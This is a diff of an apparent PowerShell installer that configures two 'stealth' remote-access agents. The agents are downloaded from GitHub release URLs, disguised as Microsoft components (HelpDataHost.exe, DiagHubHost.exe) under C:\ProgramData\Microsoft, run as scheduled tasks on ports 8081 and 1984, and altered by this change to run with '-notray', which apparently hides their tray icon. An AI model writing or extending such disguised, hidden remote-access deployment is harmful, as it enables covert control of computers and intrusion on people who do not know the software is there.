@@ -13,10 +13,10 @@ if ($normal) {
 } else {
     $agents = @()
     if ($v1) {
-        $agents += @{ Name='v1stealth'; Dir='C:\ProgramData\Microsoft\HelpData'; ExeName='HelpDataHost.exe'; TaskName='HelpDataHost'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; ExtraArgs='' }
+        $agents += @{ Name='v1stealth'; Dir='C:\ProgramData\Microsoft\HelpData'; ExeName='HelpDataHost.exe'; TaskName='HelpDataHost'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; ExtraArgs='-notray' }
     }
     if ($v2) {
-        $agents += @{ Name='v2stealth'; Dir='C:\ProgramData\Microsoft\DiagHub'; ExeName='DiagHubHost.exe'; TaskName='DiagHubHost'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='' }
+        $agents += @{ Name='v2stealth'; Dir='C:\ProgramData\Microsoft\DiagHub'; ExeName='DiagHubHost.exe'; TaskName='DiagHubHost'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='-notray' }
     }
     $stealth = $true
 }
